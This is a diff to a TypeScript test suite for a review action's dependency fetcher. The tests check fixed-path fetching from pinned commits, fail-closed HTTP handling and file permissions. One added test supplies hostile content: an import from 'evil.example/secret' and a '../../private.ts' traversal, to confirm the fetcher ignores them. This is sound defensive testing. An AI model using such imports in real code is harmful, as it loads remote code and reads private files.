@@ -9,6 +9,17 @@ import type { ReviewSnapshot } from '../src/review/types';
 const repo = 'PCD-Cooperation/pi-coding-agent-action';
 const sha = '92f2245b0a70704cb70dafe03fb7cee995e61783';
 const workflow = '.github/workflows/review.yml';
+const requiredFiles = [
+  'action.yml',
+  'packages/pi-orchestrator/src/orchestrator.ts',
+  'packages/pi-action/src/adapters/git-adapter.ts',
+  'packages/pi-platform-github/src/comments.ts',
+];
+const versionedFiles = [
+  'packages/pi-orchestrator/src/review/runner.ts',
+  'packages/pi-orchestrator/src/review/state.ts',
+  'packages/pi-platform-github/src/review-state.ts',
+];
 const directories: string[] = [];
 
 async function fixture(head = `- uses: ${repo}@${sha}`, base = head, path = workflow) {
@@ -63,7 +74,7 @@ describe('approved immutable dependency evidence', () => {
     expect(result.complete).toBe(true);
     expect(result.contexts).toHaveLength(1);
     expect(result.contexts[0]).toMatchObject({ repository: repo, sha });
-    expect(f.fetcher).toHaveBeenCalledTimes(2);
+    expect(f.fetcher).toHaveBeenCalledTimes(7);
     for (const [url, init] of f.fetcher.mock.calls) {
       expect(String(url)).toMatch(
         new RegExp(`^https://raw\\.githubusercontent\\.com/${repo}/${sha}/`)
@@ -76,15 +87,30 @@ describe('approved immutable dependency evidence', () => {
       expect(init).not.toHaveProperty('headers');
       expect(new URL(String(url)).username).toBe('');
     }
+    expect(result.policyVersion).toBe('approved-action-pins-v2');
     expect(result.contexts[0]!.files.map(file => file.path)).toEqual([
-      'action.yml',
-      'packages/pi-orchestrator/src/orchestrator.ts',
+      ...requiredFiles,
+      ...versionedFiles,
     ]);
     for (const file of result.contexts[0]!.files) {
       expect(await readFile(file.localPath, 'utf8')).toBe('public source\r\n');
       expect(file.sha256).toBe(createHash('sha256').update('public source\r\n').digest('hex'));
       expect((await stat(file.localPath)).mode & 0o777).toBe(0o600);
     }
+  });
+
+  test('fetches only fixed contract paths, never imports or URLs from fetched content', async () => {
+    const f = await fixture();
+    f.fetcher.mockImplementation(
+      async () => new Response('import "https://evil.example/secret"; import "../../private.ts";')
+    );
+    const result = await prepareReviewDependencies(f.snapshot, f.options);
+    expect(result.complete).toBe(true);
+    expect(f.fetcher.mock.calls.map(([url]) => String(url))).toEqual(
+      [...requiredFiles, ...versionedFiles].map(
+        path => `https://raw.githubusercontent.com/${repo}/${sha}/${path}`
+      )
+    );
   });
 
   test('discovers both file markers in simple unified diffs', async () => {
@@ -98,7 +124,7 @@ describe('approved immutable dependency evidence', () => {
     const result = await prepareReviewDependencies(f.snapshot, f.options);
     expect(result.complete).toBe(true);
     expect(result.contexts).toHaveLength(2);
-    expect(f.fetcher).toHaveBeenCalledTimes(4);
+    expect(f.fetcher).toHaveBeenCalledTimes(14);
   });
 
   test('simple unified nonworkflow diff and spoofed hunk markers make no network calls', async () => {
@@ -123,7 +149,7 @@ describe('approved immutable dependency evidence', () => {
     const result = await prepareReviewDependencies(f.snapshot, f.options);
     expect(result.complete).toBe(true);
     expect(result.contexts).toHaveLength(2);
-    expect(f.fetcher).toHaveBeenCalledTimes(4);
+    expect(f.fetcher).toHaveBeenCalledTimes(14);
   });
 
   test.each(['.github/workflows/README.md', 'src/\\\\303\\\\251.ts'])(
@@ -155,7 +181,7 @@ describe('approved immutable dependency evidence', () => {
     await writeFile(join(f.snapshot.basePath, path), `uses: ${repo}@${sha}`);
     await writeFile(f.snapshot.fullDiffPath, `diff --git "a/${path}" "b/${path}"\n`);
     expect((await prepareReviewDependencies(f.snapshot, f.options)).complete).toBe(true);
-    expect(f.fetcher).toHaveBeenCalledTimes(2);
+    expect(f.fetcher).toHaveBeenCalledTimes(7);
   });
 
   test.each([
@@ -170,7 +196,7 @@ describe('approved immutable dependency evidence', () => {
     expect(result.complete).toBe(true);
     expect(result.contexts).toHaveLength(1);
     expect(result.contexts[0]).toMatchObject({ repository: repo, sha });
-    expect(f.fetcher).toHaveBeenCalledTimes(2);
+    expect(f.fetcher).toHaveBeenCalledTimes(7);
   });
 
   test('does not interpret run or prompt scalar contents as action mappings', async () => {
@@ -260,7 +286,7 @@ describe('approved immutable dependency evidence', () => {
     const result = await prepareReviewDependencies(f.snapshot, f.options);
     expect(result.complete).toBe(true);
     expect(result.notes.join(' ')).toContain('base workflow absent');
-    expect(f.fetcher).toHaveBeenCalledTimes(2);
+    expect(f.fetcher).toHaveBeenCalledTimes(7);
   });
 
   test('rejects workflow file and directory symlinks', async () => {
@@ -282,7 +308,7 @@ describe('approved immutable dependency evidence', () => {
     expect(f.fetcher).not.toHaveBeenCalled();
   });
 
-  test('limits references to four and requests to eight, noting every omission', async () => {
+  test('limits references to four and requests to 28, noting every omission', async () => {
     const source = Array.from(
       { length: 6 },
       (_, i) => `- uses: ${repo}@${String(i).repeat(40)}`
@@ -290,7 +316,7 @@ describe('approved immutable dependency evidence', () => {
     const f = await fixture(source);
     const result = await prepareReviewDependencies(f.snapshot, f.options);
     expect(result.complete).toBe(false);
-    expect(f.fetcher).toHaveBeenCalledTimes(8);
+    expect(f.fetcher).toHaveBeenCalledTimes(28);
     expect(result.notes.filter(note => note.includes('Reference limit'))).toHaveLength(2);
   });
 
@@ -302,8 +328,110 @@ describe('approved immutable dependency evidence', () => {
     const result = await prepareReviewDependencies(f.snapshot, f.options);
     expect(result.complete).toBe(false);
     expect(result.contexts[0]!.files).toEqual([]);
-    expect(f.fetcher).toHaveBeenCalledTimes(2);
+    expect(f.fetcher).toHaveBeenCalledTimes(7);
   });
+
+  test.each(requiredFiles)('missing required contract %s is incomplete', async path => {
+    const f = await fixture();
+    f.fetcher.mockImplementation(
+      async url => new Response('', { status: String(url).endsWith(`/${path}`) ? 404 : 200 })
+    );
+    const result = await prepareReviewDependencies(f.snapshot, f.options);
+    expect(result.complete).toBe(false);
+    expect(result.notes.join(' ')).toContain(`/${path}: Error: HTTP 404`);
+  });
+
+  test('only explicit versioned contract 404s are optional on old pins', async () => {
+    const f = await fixture();
+    f.fetcher.mockImplementation(
+      async url =>
+        new Response('source', {
+          status: versionedFiles.some(path => String(url).endsWith(`/${path}`)) ? 404 : 200,
+        })
+    );
+    const result = await prepareReviewDependencies(f.snapshot, f.options);
+    expect(result.complete).toBe(true);
+    expect(result.contexts[0]!.files.map(file => file.path)).toEqual(requiredFiles);
+    expect(result.notes.filter(note => note.startsWith('Versioned contract absent:'))).toHaveLength(
+      3
+    );
+  });
+
+  test.each([302, 403, 429, 500])(
+    'optional contracts still fail closed on HTTP %s',
+    async status => {
+      const f = await fixture();
+      f.fetcher.mockImplementation(
+        async url =>
+          new Response('', {
+            status: versionedFiles.some(path => String(url).endsWith(`/${path}`)) ? status : 200,
+          })
+      );
+      const result = await prepareReviewDependencies(f.snapshot, f.options);
+      expect(result.complete).toBe(false);
+      expect(result.notes.filter(note => note.startsWith('Cannot stage'))).toHaveLength(3);
+    }
+  );
+
+  test('redirected optional 404 is not treated as an absent versioned file', async () => {
+    const f = await fixture();
+    f.fetcher.mockImplementation(async () => {
+      const response = new Response('', { status: 404 });
+      Object.defineProperty(response, 'redirected', { value: true });
+      return response;
+    });
+    const result = await prepareReviewDependencies(f.snapshot, f.options);
+    expect(result.complete).toBe(false);
+    expect(result.notes.filter(note => note.startsWith('Cannot stage'))).toHaveLength(7);
+  });
+
+  test
+    .runIf(process.env.RUN_PUBLIC_DEPENDENCY_SMOKE === '1')
+    .each([sha, '16999f302730474d0655540a98b7d28c394b63a5'])(
+    'public pinned source exposes call, publisher, and actual marker implementation: %s',
+    async pin => {
+      const f = await fixture(`uses: ${repo}@${pin}`);
+      const result = await prepareReviewDependencies(f.snapshot, { tempRoot: f.root });
+      expect(result.complete, result.notes.join('\n')).toBe(true);
+      const sources = new Map(
+        await Promise.all(
+          result.contexts[0]!.files.map(
+            async file => [file.path, await readFile(file.localPath, 'utf8')] as const
+          )
+        )
+      );
+      expect(sources.get(requiredFiles[1]!)).toContain(
+        'this.git.createFinalComment(body, metadata)'
+      );
+      expect(sources.get(requiredFiles[2]!)).toContain(
+        'await createFinalComment(this.deps, body, metadata)'
+      );
+      const comments = sources.get(requiredFiles[3]!)!;
+      expect(comments).toContain("const BOT_COMMENT_MARKER = '<!-- pi-coding-agent-comment -->'");
+      expect(comments).toContain(
+        "const BOT_REVIEW_COMMENT_MARKER = '<!-- pi-coding-agent-review-comment -->'"
+      );
+      expect(comments).toContain(
+        'const marker = isReviewComment ? BOT_REVIEW_COMMENT_MARKER : BOT_COMMENT_MARKER'
+      );
+      expect(comments).toContain('const markedBody = `${marker}\\n${finalBody}`');
+      expect(comments).toContain('return createComment(deps, markedBody)');
+      expect(comments).toContain('octokit.rest.issues.createComment(');
+      if (pin !== sha) {
+        expect(sources.get(versionedFiles[0]!)).toContain('provider.statefulReview.publish(');
+        expect(sources.get(versionedFiles[1]!)).toContain(
+          "export const REVIEW_STATE_MARKER = '<!-- pi-stateful-review:v1 -->'"
+        );
+        expect(sources.get(versionedFiles[1]!)).toContain(
+          'const lines = [\n    REVIEW_STATE_MARKER,'
+        );
+        expect(sources.get(versionedFiles[2]!)).toContain(
+          'octokit.rest.issues.createComment({ ...repo, issue_number: pullNumber, body })'
+        );
+      }
+    },
+    60_000
+  );
 
   test('uses redirect:error and treats fetch redirect rejection as incomplete', async () => {
     const f = await fixture();
@@ -331,7 +459,7 @@ describe('approved immutable dependency evidence', () => {
     const result = await prepareReviewDependencies(f.snapshot, f.options);
     expect(result.complete).toBe(false);
     expect(result.contexts[0]!.files).toEqual([]);
-    expect(cancel).toHaveBeenCalledTimes(2);
+    expect(cancel).toHaveBeenCalledTimes(7);
   });
 
   test.each(['fetch', 'body'])(
